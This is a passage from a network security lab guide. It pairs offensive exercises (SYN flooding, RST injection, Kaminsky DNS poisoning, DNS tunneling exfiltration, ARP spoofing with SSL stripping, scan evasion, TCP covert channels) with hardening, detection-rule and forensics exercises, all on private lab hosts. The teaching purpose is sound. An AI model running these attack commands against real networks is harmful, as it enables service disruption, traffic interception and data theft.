                                   "Base32/64 encoded data in DNS labels")
        
        tls = TLSSessionAnalyzer(pcap_file)
        weak_tls = tls.detect_weak_tls()
        if weak_tls:
            report_gen.add_finding("MEDIUM", "TLS Weakness",
                                   f"{len(weak_tls)} sessions with deprecated TLS/weak ciphers",
                                   "Potential for interception or downgrade attacks")
        
        output = f"/opt/forensics/reports/{case_id}_report.md"
        report_gen.generate_report(output)

if __name__ == "__main__":
    main()
PYEOF
chmod +x /opt/forensics/scripts/network_forensics_toolkit.py

echo "[✓] VM4 forensics tools configured"
```

---

## PART A: OFFENSIVE (Attack Scenarios)

### Exercise 1: SYN Flood and SYN Cookie Bypass

**Objective:** Demonstrate TCP SYN flooding, observe SYN cookie activation, and understand backlog exhaustion.

**Step 1 — Prepare the target (VM1):**

```bash
# Set vulnerable parameters (no SYN cookies, small backlog)
sudo /opt/set_vuln_tcp_params.sh

# Start the echo server
python3 /opt/tcp_echo_server.py &

# Monitor SYN_RECV state in real-time
watch -n 0.5 'ss -tn state syn-recv | wc -l'
```

**Step 2 — Baseline connection test (VM2):**

```bash
# Verify normal connectivity
ncat -v 10.9.1.10 9999 <<< "TEST"
# Expected: ECHO: TEST

# Check initial backlog
ss -tn state syn-recv dst 10.9.1.10 | wc -l
# Expected: 0
```

**Step 3 — Execute SYN flood (VM2):**

```bash
# Scapy-based SYN flood (controlled — 500 packets)
sudo python3 /opt/attacks/tcp/syn_flood.py 10.9.1.10 9999 500

# Alternatively, with hping3:
sudo hping3 -S --flood -V -p 9999 --rand-source 10.9.1.10 -c 1000
```

**Step 4 — Observe impact (VM1):**

```bash
# Check SYN_RECV sockets
ss -tn state syn-recv | wc -l
# Expected: ~128 (backlog full)

# Check kernel counters
cat /proc/net/netstat | grep -i syncookie
# SyncookiesSent: 0 (cookies disabled)
# SyncookiesRecv: 0
# SyncookiesFailed: 0

# Try to connect from a legitimate source — should fail
ncat -v 10.9.1.10 9999 -w 2 <<< "BLOCKED?"
# Expected: Connection timed out
```

**Step 5 — Enable SYN cookies and re-test:**

```bash
# On VM1: Enable SYN cookies
sudo sysctl -w net.ipv4.tcp_syncookies=1
sudo sysctl -w net.ipv4.tcp_max_syn_backlog=65535

# Re-run flood from VM2
sudo python3 /opt/attacks/tcp/syn_flood.py 10.9.1.10 9999 500

# On VM1: Check counters
cat /proc/net/netstat | grep -i syncookie
# SyncookiesSent: >0 (cookies being issued!)

# Verify legitimate connection still works
ncat -v 10.9.1.10 9999 <<< "STILL WORKS?"
# Expected: ECHO: STILL WORKS?
```

**Step 6 — Analyze SYN cookie limitations:**

```bash
# The SYN cookie encodes MSS in 3 bits (8 values), loses SACK and window scaling
# Capture a connection established via SYN cookie:
sudo tcpdump -i eth0 -c 20 -nn 'tcp port 9999 and tcp[tcpflags] & tcp-syn != 0' -w /tmp/syncookie.pcap

# Analyze in tshark:
tshark -r /tmp/syncookie.pcap -Y "tcp.flags.syn==1" -T fields \
  -e ip.src -e tcp.options.mss_val -e tcp.options.wscale.shift -e tcp.options.sack_perm
# With SYN cookies: window scale and SACK may be absent from the ACK
```

**Expected results:**
- Without SYN cookies: backlog fills at 128, legitimate connections dropped
- With SYN cookies: flood absorbed, legitimate connections succeed, but with degraded TCP options

---

### Exercise 2: TCP RST Injection and Session Disruption

**Objective:** Inject RST packets to terminate an active TCP session, demonstrating both on-path and blind injection.

**Step 1 — Establish a long-lived connection (VM1):**

```bash
# Start persistent connection server
python3 /opt/tcp_persistent_conn.py &

# From VM2, connect and maintain:
ncat 10.9.1.10 17900 &
NC_PID=$!
# Verify keepalives:
sleep 6 && kill -0 $NC_PID && echo "Connection alive"
```

**Step 2 — On-path RST injection (VM2 — sniff and inject):**

```bash
# In a separate terminal, run the RST injector
sudo python3 /opt/attacks/tcp/rst_injection.py sniff 10.9.1.10 17900
```

**Step 3 — Observe the RST:**

```bash
# Check if the ncat connection was terminated
kill -0 $NC_PID 2>/dev/null || echo "CONNECTION KILLED BY RST"

# On VM1, the server should report:
# [!] Connection terminated: Connection reset by peer
```

**Step 4 — Blind RST injection (demonstrate difficulty):**

```bash
# Without sniffing capability, brute-force the sequence space
# This demonstrates why RST injection is hard against modern systems:
# Window size 65535 → probability per RST = 65535/4294967296 ≈ 0.0015%
# Need ~65536 RSTs to cover the 32-bit sequence space

# Re-establish connection
ncat 10.9.1.10 17900 &
NC_PID=$!

# Identify the connection's source port
SRC_PORT=$(ss -tn dst 10.9.1.10:17900 | awk 'NR==2{split($4,a,":"); print a[2]}')
echo "Source port: $SRC_PORT"

# Attempt blind RST (limited demo — 10000 packets)
sudo python3 /opt/attacks/tcp/rst_injection.py blind 10.9.1.10 17900 10.9.1.20 $SRC_PORT
```

**Step 5 — CVE-2016-5696 side-channel (demonstrate the concept):**

```bash
# On VM1: check challenge ACK limit
sysctl net.ipv4.tcp_challenge_ack_limit
# If 100: vulnerable to side-channel

# The attack principle: an off-path attacker sends RSTs to probe the global
# challenge ACK counter. If counter exhausted → target connection exists.
# Fix:
sudo sysctl -w net.ipv4.tcp_challenge_ack_limit=2147483647
```

**Step 6 — Hardened detection (VM3):**

```bash
# Start Suricata monitoring
sudo suricata -c /etc/suricata/suricata.yaml -i eth0 &

# Replay the attack — check alerts
sleep 5
cat /var/log/suricata/fast.log | grep "RST"
# Expected: "LAB TCP RST Injection Flood" alert triggered
```

---

### Exercise 3: DNS Cache Poisoning (Kaminsky Attack)

**Objective:** Demonstrate the Kaminsky DNS cache poisoning attack mechanics against a local resolver.

**Step 1 — Verify resolver is operational (VM1):**

```bash
# Test recursive resolution
dig @10.9.1.10 www.target.lab
# Expected: 10.9.1.10 (from local zone)

# Check recursion is enabled (vuln: open resolver)
dig @10.9.1.10 example.com +short
# Should resolve (open recursion enabled)
```

**Step 2 — Observe normal resolution path:**

```bash
# From VM2: trace the resolution
dig @10.9.1.10 +trace test.target.lab
# Shows delegation chain

# Check resolver's source port randomization
# Send 10 queries and observe port diversity
for i in $(seq 10); do
    dig @10.9.1.10 "test${i}.target.lab" +short &
done
wait

# On VM1, check recent outgoing DNS (source ports should be random):
sudo tcpdump -i eth0 -c 10 -nn 'udp and dst port 53 and src host 10.9.1.10' \
  -t 2>/dev/null | awk '{print $3}' | cut -d. -f5
```

**Step 3 — Execute Kaminsky demo (VM2):**

```bash
# Run the attack (limited — educational demonstration)
sudo python3 /opt/attacks/dns/kaminsky_demo.py \
    10.9.1.10 \        # resolver
    target.lab \       # target domain
    10.9.1.20 \        # attacker NS IP
    10.9.1.10 \        # spoofed auth NS IP
    50                  # attempts

# Note: With source port randomization (default in modern BIND),
# success requires guessing both TXID (16 bits) AND port (16 bits) = 2^32
# This demo will almost certainly fail — that's the point!
```

**Step 4 — Demonstrate why modern defenses work:**

```bash
# Source port randomization adds ~16 bits of entropy
# Check BIND's port randomization:
sudo rndc status | grep "source"
# Or check /etc/bind/named.conf.options for query-source configuration

# 0x20 encoding (if supported): verify case randomization
dig @10.9.1.10 wWw.TaRgEt.LaB
# Resolver may randomize case in outgoing queries and verify response matches

# DNSSEC validation: if the zone is signed, forged responses are rejected
dig @10.9.1.10 signed.lab +dnssec
```

**Step 5 — Successful poisoning scenario (disabled defenses — VM1):**

```bash
# ONLY for demonstration: temporarily disable source port randomization
# In /etc/bind/named.conf.options, add:
#   query-source address * port 33333;
# This fixes the source port, making TXID the only unknown (16 bits)
# DO NOT DO THIS IN PRODUCTION

# After disabling randomization and re-running the attack with more attempts,
# success rate increases dramatically (birthday bound: ~256 attempts for 50% success)
```

---

### Exercise 4: DNS Tunneling and Exfiltration

**Objective:** Set up DNS tunneling for data exfiltration and C2, then detect it.

**Step 1 — Start DNS tunnel server (VM1):**

```bash
sudo /opt/start_dns_tunnel_server.sh
# Starts iodined on tunnel.target.lab
```

**Step 2 — Connect DNS tunnel client (VM2):**

```bash
# Using iodine
sudo iodine -f -P labpassword123 10.9.1.10 tunnel.target.lab
# Creates tun0 interface; traffic tunneled through DNS

# Verify tunnel
ping -c 3 10.53.0.1
# Should get replies through the DNS tunnel

# Measure bandwidth
dd if=/dev/zero bs=1024 count=100 | nc -w 5 10.53.0.1 9999
# Typical: 50-200 kbps via DNS tunnel
```

**Step 3 — Custom exfiltration via DNS labels (VM2):**

```bash
# Create sensitive data to exfiltrate
echo "CONFIDENTIAL: API_KEY=sk_live_abc123_secret_production_key" > /tmp/secret.txt

# Exfiltrate via DNS queries
sudo python3 /opt/attacks/dns/dns_tunnel_client.py exfil \
    /tmp/secret.txt tunnel.target.lab 10.9.1.10
```

**Step 4 — Capture and analyze tunnel traffic (VM3):**

```bash
# Capture DNS traffic during tunnel operation
sudo tcpdump -i eth0 -w /tmp/dns_tunnel_capture.pcap 'udp port 53' &
TCPDUMP_PID=$!

# Wait for tunnel traffic, then stop
sleep 30
kill $TCPDUMP_PID

# Analyze with tshark
tshark -r /tmp/dns_tunnel_capture.pcap -Y "dns" \
  -T fields -e dns.qry.name -e dns.qry.type | head -20

# Check query lengths
tshark -r /tmp/dns_tunnel_capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name | awk '{print length, $0}' | sort -rn | head -10
# Expected: queries >50 characters with encoded data

# Check for NULL record queries (iodine default)
tshark -r /tmp/dns_tunnel_capture.pcap -Y "dns.qry.type == 10" | wc -l
# iodine uses NULL (type 10) records
```

**Step 5 — Verify Zeek detection (VM3):**

```bash
# Process capture with Zeek
zeek -r /tmp/dns_tunnel_capture.pcap /opt/zeek/scripts/dns_tunnel_detect.zeek

# Check notices
cat notice.log | zeek-cut note msg
# Expected:
#   DNSTunnelDetect::DNS_Tunnel_Long_Query
#   DNSTunnelDetect::DNS_Tunnel_High_Entropy
#   DNSTunnelDetect::DNS_Tunnel_High_Volume
```

---

### Exercise 5: TLS Vulnerability Assessment

**Objective:** Scan TLS configurations for weaknesses including protocol downgrade, weak ciphers, missing HSTS, and certificate issues.

**Step 1 — Scan the secure endpoint:**

```bash
# From VM2: scan the TLS 1.3-only endpoint
python3 /opt/attacks/tls/tls_scanner.py 10.9.1.10 443

# Expected output: no critical findings
# TLS 1.3 supported, no legacy versions, HSTS present
```

**Step 2 — Scan the vulnerable endpoint:**

```bash
# Scan the intentionally weak TLS configuration
python3 /opt/attacks/tls/tls_scanner.py 10.9.1.10 4430

# Expected: CRITICAL/HIGH findings
# - TLS 1.0/1.1 supported
# - Weak DH parameters (512-bit — Logjam)
# - Weak ciphers available
```

**Step 3 — Test with standard tools:**

```bash
# testssl.sh comprehensive scan
testssl --protocols --vulnerable --cipher-per-proto 10.9.1.10:4430

# Nmap SSL scripts
nmap --script ssl-enum-ciphers,ssl-cert,ssl-dh-params -p 4430 10.9.1.10

# OpenSSL probing
openssl s_client -connect 10.9.1.10:4430 -tls1 2>/dev/null | grep "Protocol"
openssl s_client -connect 10.9.1.10:4430 -tls1_1 2>/dev/null | grep "Protocol"
```

**Step 4 — Test 0-RTT replay vulnerability:**

```bash
# Connect to the 0-RTT enabled endpoint
openssl s_client -connect 10.9.1.10:4431 -tls1_3 -sess_out /tmp/session.pem

# Reconnect using session resumption with early data
echo -e "GET /api/transfer HTTP/1.1\r\nHost: earlydata.lab.local\r\n\r\n" | \
  openssl s_client -connect 10.9.1.10:4431 -tls1_3 \
  -sess_in /tmp/session.pem -early_data /dev/stdin

# The server processes the request in 0-RTT (potential replay!)
# Attacker could capture and replay this request
```

**Step 5 — JA3 fingerprinting:**

```bash
# Capture TLS handshakes
sudo tcpdump -i eth0 -w /tmp/tls_handshakes.pcap 'tcp port 443 or tcp port 4430' &
sleep 2

# Generate connections with different clients
curl -sk https://10.9.1.10/ > /dev/null
wget -q --no-check-certificate https://10.9.1.10/ -O /dev/null
python3 -c "import urllib.request, ssl; urllib.request.urlopen('https://10.9.1.10/', context=ssl._create_unverified_context())"

kill %1

# Extract JA3 fingerprints
tshark -r /tmp/tls_handshakes.pcap -Y "tls.handshake.type == 1" \
  -T fields -e ip.src -e tls.handshake.ja3
# Each client has a distinct JA3 fingerprint
```

---

### Exercise 6: MITM — ARP Poisoning and SSL Stripping

**Objective:** Perform ARP poisoning to become a man-in-the-middle, then strip TLS from HTTP→HTTPS redirects.

**Step 1 — Verify normal ARP state (VM1):**

```bash
# Check ARP table
ip neighbor show
# Gateway: 10.9.1.1 → real MAC address
```

**Step 2 — Enable IP forwarding and ARP spoofing (VM2):**

```bash
# Enable forwarding (so traffic still flows through us)
sudo sysctl -w net.ipv4.ip_forward=1

# Start ARP spoofing with Bettercap
sudo bettercap -iface eth0 -eval "
  set arp.spoof.fullduplex true;
  set arp.spoof.targets 10.9.1.10;
  arp.spoof on;
  set http.proxy.sslstrip true;
  http.proxy on;
  net.sniff on
"
```

**Step 3 — Verify ARP poisoning (VM1):**

```bash
# Check ARP table after attack
ip neighbor show
# Gateway 10.9.1.1 should now have VM2's MAC address
# This means VM1's traffic to the gateway flows through VM2
```

**Step 4 — Observe SSL stripping:**

```bash
# From VM1, attempt to visit the HTTP endpoint (redirects to HTTPS)
curl -v http://10.9.1.10/ 2>&1 | grep -i "location"
# Without MITM: Location: https://secure.lab.local/...
# With MITM + sslstrip: redirect intercepted, stays on HTTP

# On VM2, Bettercap logs show intercepted credentials
cat /tmp/bettercap_creds.log
```

**Step 5 — HSTS bypass limitation:**

```bash
# Test against an endpoint with HSTS:
# If the victim has previously visited (HSTS cached), stripping fails.
# The browser remembers "always use HTTPS" for this domain.

# Verify HSTS header:
curl -sI https://10.9.1.10/ | grep -i strict
# Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**Step 6 — Detect the attack (VM3):**

```bash
# ARP anomaly detection
sudo arpwatch -i eth0 &
# Should alert on MAC/IP mapping change

# Suricata alert
cat /var/log/suricata/fast.log | grep -i "arp"
```

**Cleanup:**

```bash
# On VM2: stop Bettercap, disable forwarding
sudo sysctl -w net.ipv4.ip_forward=0
```

---

### Exercise 7: Network Scanning and Firewall Evasion

**Objective:** Perform comprehensive port scanning using multiple techniques, then evade detection using fragmentation, timing, and source port manipulation.

**Step 1 — Standard scanning (VM2):**

```bash
# Run comprehensive scan
/opt/attacks/scan/comprehensive_scan.sh 10.9.1.10
```

**Step 2 — Stealth scanning techniques:**

```bash
# SYN scan (half-open — stealthiest standard option)
sudo nmap -sS -T2 -p 80,443,9999,17900 10.9.1.10 --reason

# Idle scan (requires a zombie with incremental IPID)
# First, find a zombie:
sudo hping3 -S -r -p 80 10.9.1.1
# If IPID increments by +1, it's a valid zombie

# Perform idle scan via our script
sudo python3 /opt/attacks/tcp/idle_scan.py 10.9.1.1 10.9.1.10 80,443,9999
```

**Step 3 — Firewall evasion with Scapy:**

```bash
# Fragmented SYN
sudo python3 /opt/attacks/evasion/firewall_evasion.py fragment 10.9.1.10 80 8

# Source port 53 bypass
sudo python3 /opt/attacks/evasion/firewall_evasion.py srcport 10.9.1.10 80 53

# Decoy scan
sudo python3 /opt/attacks/evasion/firewall_evasion.py decoy 10.9.1.10 80 10
```

**Step 4 — Timing evasion:**

```bash
# Paranoid timing (T0): 5-minute intervals between probes
sudo nmap -sS -T0 -p 80,443 10.9.1.10 --max-retries 1

# Sneaky (T1): 15-second intervals
sudo nmap -sS -T1 -p 22,80,443,8080 10.9.1.10
```

**Step 5 — Nmap with fragmentation and decoys:**

```bash
# Combined evasion
sudo nmap -sS -f -D RND:5,ME --source-port 53 --data-length 32 \
  -T2 -p 80,443,9999 10.9.1.10 --reason

# Explanation:
# -f: fragment packets into 8-byte IP fragments
# -D RND:5,ME: 5 random decoy IPs + our real IP mixed in
# --source-port 53: use source port 53 (DNS)
# --data-length 32: append random data (changes signature)
# -T2: polite timing
```

**Step 6 — masscan for speed:**

```bash
# masscan — stateless internet-scale scanner
sudo masscan -p 80,443,8080,9999 10.9.1.0/24 --rate=1000
# Completes in seconds for a /24
```

---

### Exercise 8: TCP Covert Channels

**Objective:** Establish covert communication channels using TCP protocol fields (ISN, options, urgent pointer).

**Step 1 — ISN covert channel:**

```bash
# On VM1: start receiver
sudo python3 /opt/attacks/tcp/covert_channel.py isn recv 0.0.0.0 8888

# On VM2: send secret message via ISN
sudo python3 /opt/attacks/tcp/covert_channel.py isn send 10.9.1.10 8888 "EXFILTRATED_PASSWORD_123"

# VM1 should display: [+] Received ... bytes → EXFILTRATED_PASSWORD_123
```

**Step 2 — TCP option covert channel:**

```bash
# Uses unassigned TCP option kind 19
sudo python3 /opt/attacks/tcp/covert_channel.py option send 10.9.1.10 8888 "HIDDEN_IN_TCP_OPTIONS"
```

**Step 3 — Urgent pointer channel:**

```bash
# Data encoded in urgent pointer field (URG flag NOT set — evades most IDS)
sudo python3 /opt/attacks/tcp/covert_channel.py urgptr send 10.9.1.10 8888 "URGENT_PTR_COVERT"
```

**Step 4 — Capture and analyze (VM3):**

```bash
# Capture during covert channel operation
sudo tcpdump -i eth0 -w /tmp/covert_channel.pcap 'tcp port 8888'

# Analyze unusual TCP options
tshark -r /tmp/covert_channel.pcap -Y "tcp.option_kind >= 9 and tcp.option_kind <= 26" \
  -T fields -e ip.src -e tcp.option_kind -e tcp.options

# Check for non-zero urgent pointer without URG flag
tshark -r /tmp/covert_channel.pcap -Y "tcp.urgent_pointer > 0 and tcp.flags.urg == 0" \
  -T fields -e ip.src -e tcp.urgent_pointer
```

**Step 5 — Zeek detection:**

```bash
# Process capture with Zeek anomaly script
zeek -r /tmp/covert_channel.pcap /opt/zeek/scripts/tcp_anomaly_detect.zeek
cat notice.log | zeek-cut note msg
# Expected: TCP_Covert_Channel_Option notices
```

---

## PART B: DEFENSIVE (Protection Systems)

### Exercise 9: Network Stack Hardening

**Objective:** Apply comprehensive TCP/IP, DNS, and TLS hardening to a Linux system.

**Step 1 — TCP stack hardening (VM1):**

```bash
# Create comprehensive hardening script
cat > /opt/harden_tcp_stack.sh <<'EOF'
#!/bin/bash
echo "[*] Applying TCP/IP stack hardening..."

# SYN flood protection
sysctl -w net.ipv4.tcp_syncookies=1
sysctl -w net.ipv4.tcp_max_syn_backlog=65535
sysctl -w net.core.somaxconn=65535
sysctl -w net.ipv4.tcp_synack_retries=2

# RST injection mitigation (CVE-2016-5696)
sysctl -w net.ipv4.tcp_challenge_ack_limit=2147483647

# Disable timestamp information leakage (trade-off: breaks PAWS)
# Use mode 2 for per-connection randomization on Linux 5.0+
sysctl -w net.ipv4.tcp_timestamps=2 2>/dev/null || sysctl -w net.ipv4.tcp_timestamps=0

# Anti-spoofing (BCP38)
sysctl -w net.ipv4.conf.all.rp_filter=1
sysctl -w net.ipv4.conf.default.rp_filter=1

# Disable source routing
sysctl -w net.ipv4.conf.all.accept_source_route=0
sysctl -w net.ipv6.conf.all.accept_source_route=0

# Disable ICMP redirects (prevent route manipulation)
sysctl -w net.ipv4.conf.all.accept_redirects=0
sysctl -w net.ipv4.conf.all.send_redirects=0
sysctl -w net.ipv6.conf.all.accept_redirects=0

# Ignore ICMP echo (optional — breaks ping)
# sysctl -w net.ipv4.icmp_echo_ignore_all=1

# Rate-limit ICMP
sysctl -w net.ipv4.icmp_ratelimit=100

# Connection tracking limits
sysctl -w net.ipv4.tcp_max_orphans=65536
sysctl -w net.ipv4.tcp_fin_timeout=30
sysctl -w net.ipv4.tcp_tw_reuse=1
sysctl -w net.ipv4.tcp_keepalive_time=600
sysctl -w net.ipv4.tcp_keepalive_intvl=30
sysctl -w net.ipv4.tcp_keepalive_probes=3

# IPv6 hardening
sysctl -w net.ipv6.conf.all.accept_ra=0
sysctl -w net.ipv6.conf.default.accept_ra=0
sysctl -w net.ipv6.conf.all.use_tempaddr=2

# Disable TCP Fast Open if not needed (replay risk)
sysctl -w net.ipv4.tcp_fastopen=0

echo "[✓] TCP/IP stack hardened"
EOF
chmod +x /opt/harden_tcp_stack.sh
sudo /opt/harden_tcp_stack.sh
```

**Step 2 — nftables firewall with microsegmentation:**

```bash
cat > /opt/apply_firewall.sh <<'EOF'
#!/bin/bash
echo "[*] Applying nftables firewall rules..."

nft flush ruleset

nft add table inet filter
nft add chain inet filter input '{ type filter hook input priority 0; policy drop; }'
nft add chain inet filter forward '{ type filter hook forward priority 0; policy drop; }'
nft add chain inet filter output '{ type filter hook output priority 0; policy accept; }'

# Allow established/related
nft add rule inet filter input ct state established,related accept

# Allow loopback
nft add rule inet filter input iif lo accept

# Rate-limit ICMP
nft add rule inet filter input icmp type echo-request limit rate 10/second accept
nft add rule inet filter input icmp type echo-request drop

# SYN flood protection
nft add rule inet filter input tcp flags syn limit rate 500/second burst 1000 packets accept
nft add rule inet filter input tcp flags syn drop

# Allow specific services
nft add rule inet filter input tcp dport { 22, 80, 443, 53 } accept
nft add rule inet filter input udp dport 53 accept

# Rate-limit new connections per source
nft add rule inet filter input tcp dport 80 ct state new \
  meter per_ip '{ ip saddr limit rate 50/second burst 100 packets }' accept
nft add rule inet filter input tcp dport 80 ct state new drop

# Drop IP fragments (aggressive — may break legitimate traffic)
# nft add rule inet filter input ip frag-off != 0 drop

# Log and drop everything else
nft add rule inet filter input log prefix "NFTABLES_DROP: " drop

echo "[✓] Firewall rules applied"
nft list ruleset
EOF
chmod +x /opt/apply_firewall.sh
sudo /opt/apply_firewall.sh
```

**Step 3 — DNS hardening (VM1):**

```bash
# Secure BIND configuration
cat > /etc/bind/named.conf.options.secure <<'EOF'
options {
    directory "/var/cache/bind";
    
    // Restrict recursion to local networks only
    recursion yes;
    allow-recursion { 10.9.1.0/24; 127.0.0.0/8; };
    allow-query { 10.9.1.0/24; 127.0.0.0/8; };
    
    // DNSSEC validation
    dnssec-validation auto;
    
    // Source port randomization (default, but explicit)
    // Use random ports for outgoing queries (adds 16 bits entropy)
    use-v4-udp-ports { range 1024 65535; };
    
    // 0x20 query name randomization
    // (adds entropy by randomizing case of query name)
    
    // Rate limiting (Response Rate Limiting)
    rate-limit {
        responses-per-second 10;
        window 5;
        log-only no;
    };
    
    // Hide version
    version "none";
    hostname "none";
    
    // Prevent zone transfers
    allow-transfer { none; };
    
    // Minimal responses (don't include unnecessary additional section)
    minimal-responses yes;
    
    // DNS rebinding protection
    // (handled by resolver-side private-address filtering in Unbound)
    
    listen-on { 127.0.0.1; 10.9.1.10; };
    listen-on-v6 { none; };
};
EOF

# Apply secure config
sudo cp /etc/bind/named.conf.options.secure /etc/bind/named.conf.options
sudo named-checkconf && sudo systemctl restart bind9
echo "[✓] DNS hardened"
```

**Step 4 — TLS hardening (VM1 Nginx):**

```bash
# Generate strong DH parameters
sudo openssl dhparam -out /etc/nginx/ssl/strong_dh.pem 4096

# Apply Mozilla Modern TLS config
cat > /etc/nginx/conf.d/tls-hardened.conf <<'EOF'
# Mozilla Modern TLS configuration
ssl_protocols TLSv1.3;
ssl_prefer_server_ciphers off;
ssl_session_timeout 1d;
ssl_session_cache shared:SSL:10m;
ssl_session_tickets off;
ssl_stapling on;
ssl_stapling_verify on;

# HSTS
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

# Security headers
add_header X-Content-Type-Options nosniff always;
add_header X-Frame-Options DENY always;
add_header Referrer-Policy strict-origin-when-cross-origin always;
EOF

sudo nginx -t && sudo systemctl reload nginx
echo "[✓] TLS hardened (TLS 1.3 only, HSTS, security headers)"
```

**Step 5 — Verify hardening:**

```bash
# Re-run TLS scanner from VM2
python3 /opt/attacks/tls/tls_scanner.py 10.9.1.10 443
# Expected: all checks pass, no findings

# Re-attempt SYN flood
sudo python3 /opt/attacks/tcp/syn_flood.py 10.9.1.10 80 500
# Expected: SYN cookies activate, legitimate connections still work

# Re-attempt DNS amplification query
dig @10.9.1.10 ANY example.com
# Expected: REFUSED (recursion restricted to local networks)
```

---

### Exercise 10: Detection Rule Validation and Tuning

**Objective:** Validate Suricata, Sigma, and Zeek rules against known attack patterns.

**Step 1 — Validate Suricata rules (VM3):**

```bash
# Test rule syntax
sudo suricata -T -c /etc/suricata/suricata.yaml
echo "Exit code: $?"  # 0 = success

# Count custom rules
grep -c "^alert" /etc/suricata/rules/custom/network-attacks.rules
```

**Step 2 — Generate test traffic and verify alerts:**

```bash
# From VM2: generate SYN flood (should trigger sid:9000001)
sudo hping3 -S --flood -p 80 --rand-source -c 2000 10.9.1.10 2>/dev/null

# From VM2: generate NULL scan (should trigger sid:9000004)
sudo nmap -sN -p 80,443 10.9.1.10

# From VM2: generate DNS tunnel-like query (should trigger sid:9000010)
dig @10.9.1.10 "aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbcccccccccccccccc.test.target.lab" TXT

# Check alerts on VM3:
sleep 5
grep "LAB" /var/log/suricata/fast.log | tail -20
```

**Step 3 — Validate Sigma rules:**

```bash
# Check YAML syntax for all rules
for rule in /opt/sigma/rules/*.yml; do
    python3 -c "import yaml; yaml.safe_load(open('$rule'))" 2>&1 || \
        echo "INVALID: $rule"
done
echo "[✓] All Sigma rules valid YAML"

# Convert Sigma to Suricata format (if sigmac available)
# sigmac -t suricata /opt/sigma/rules/dns_tunneling.yml
```

**Step 4 — Zeek rule validation:**

```bash
# Generate test pcap with known attack pattern
python3 -c "
from scapy.all import *
pkts = []
# DNS tunnel-like queries (long names, high entropy)
for i in range(50):
    import random, string
    sub = ''.join(random.choices(string.ascii_lowercase + string.digits, k=40))
    pkt = IP(src='10.9.1.20', dst='10.9.1.10')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=f'{sub}.tunnel.evil.lab', qtype='TXT'))
    pkts.append(pkt)
wrpcap('/tmp/test_dns_tunnel.pcap', pkts)
print(f'Generated {len(pkts)} test packets')
"

# Process with Zeek
cd /tmp
zeek -r /tmp/test_dns_tunnel.pcap /opt/zeek/scripts/dns_tunnel_detect.zeek

# Check for notices
if [ -f notice.log ]; then
    echo "[+] Zeek notices generated:"
    cat notice.log | zeek-cut note msg | head -10
else
    echo "[-] No notices (check script)"
fi
```

**Step 5 — False positive analysis:**

```bash
# Generate legitimate-looking but long DNS queries (CDN, DKIM)
python3 -c "
from scapy.all import *
pkts = []
# Legitimate long queries (should NOT trigger)
legitimate = [
    'long-cdn-identifier-hash-abc123def456.cdn.cloudflare.com',
    'selector1._domainkey.example.com',
    '_acme-challenge.very-long-subdomain.certbot.example.com'
]
for q in legitimate:
    pkt = IP(src='10.9.1.20', dst='10.9.1.10')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=q))
    pkts.append(pkt)
wrpcap('/tmp/test_legit_dns.pcap', pkts)
"

zeek -r /tmp/test_legit_dns.pcap /opt/zeek/scripts/dns_tunnel_detect.zeek
# Check if filter_cdn exclusion works:
cat notice.log 2>/dev/null | zeek-cut note msg | grep -c "cloudflare"
# Expected: 0 (filtered out)
```

---

### Exercise 11: Network Forensics Investigation

**Objective:** Perform a complete forensic investigation of a simulated network incident using the forensics toolkit.

**Step 1 — Create simulated incident capture (VM4):**

```bash
# Generate a realistic incident pcap containing:
# - Normal traffic baseline
# - DNS tunneling exfiltration
# - TLS connections to suspicious endpoints
# - Port scanning
python3 -c "
from scapy.all import *
import random, string, time

pkts = []
base_time = 1700000000.0  # Fixed epoch for reproducibility

# Normal DNS queries (baseline)
for i in range(20):
    pkt = IP(src='10.9.1.50', dst='10.9.1.10')/UDP(dport=53)/DNS(
        rd=1, qd=DNSQR(qname=random.choice(['www.google.com', 'api.github.com', 'cdn.jsdelivr.net'])))
    pkt.time = base_time + i * 2
    pkts.append(pkt)

# DNS exfiltration (starts at t+60)
for i in range(30):
    encoded = ''.join(random.choices(string.ascii_lowercase + string.digits, k=45))
    pkt = IP(src='10.9.1.50', dst='10.9.1.10')/UDP(dport=53)/DNS(
        rd=1, qd=DNSQR(qname=f'{encoded}.tunnel.evil.lab', qtype='TXT'))
    pkt.time = base_time + 60 + i * 0.5
    pkts.append(pkt)

# Port scan (starts at t+120)
for port in range(1, 101):
    pkt = IP(src='10.9.1.99', dst='10.9.1.10')/TCP(dport=port, flags='S')
    pkt.time = base_time + 120 + port * 0.1
    pkts.append(pkt)

# TLS to suspicious endpoint (starts at t+150)
for i in range(5):
    pkt = IP(src='10.9.1.50', dst='203.0.113.66')/TCP(dport=443, flags='S')
    pkt.time = base_time + 150 + i * 10
    pkts.append(pkt)

wrpcap('/tmp/simulated_incident.pcap', pkts)
print(f'Generated incident pcap: {len(pkts)} packets')
"
```

**Step 2 — Register evidence:**

```bash
python3 /opt/forensics/scripts/network_forensics_toolkit.py \
    evidence /tmp/simulated_incident.pcap "Simulated network incident for lab exercise"
```

**Step 3 — Run full forensic analysis:**

```bash
# TCP stream analysis
python3 /opt/forensics/scripts/network_forensics_toolkit.py \
    streams /tmp/simulated_incident.pcap

# DNS forensics (tunnel detection)
python3 /opt/forensics/scripts/network_forensics_toolkit.py \
    dns /tmp/simulated_incident.pcap

# Build timeline
python3 /opt/forensics/scripts/network_forensics_toolkit.py \
    timeline /tmp/simulated_incident.pcap
```

**Step 4 — Generate forensic report:**

```bash
python3 /opt/forensics/scripts/network_forensics_toolkit.py \
    report CASE-2024-001 /tmp/simulated_incident.pcap

# Review report
cat /opt/forensics/reports/CASE-2024-001_report.md
```

**Step 5 — Verify evidence integrity:**

```bash
python3 /opt/forensics/scripts/network_forensics_toolkit.py \
    verify EV-0001
# Expected: [✓] EV-0001: Integrity VERIFIED
```

---

## PART C: FRAMEWORK DEVELOPMENT

### Network Security Assessment Toolkit

A comprehensive Python toolkit that combines offensive scanning, defensive validation, and forensic analysis into a single framework.

```python
#!/usr/bin/env python3
"""
Network Security Assessment Toolkit (NSAT)
==========================================
Combines TCP/IP security testing, DNS security analysis, TLS vulnerability
scanning, MITM detection, network forensics, and detection rule generation
into a unified assessment framework.

Modules:
1. TCPSecurityAssessor — SYN flood resilience, RST injection resistance, covert channel detection
2. DNSSecurityAssessor — Open resolver, amplification, tunnel detection, DNSSEC validation
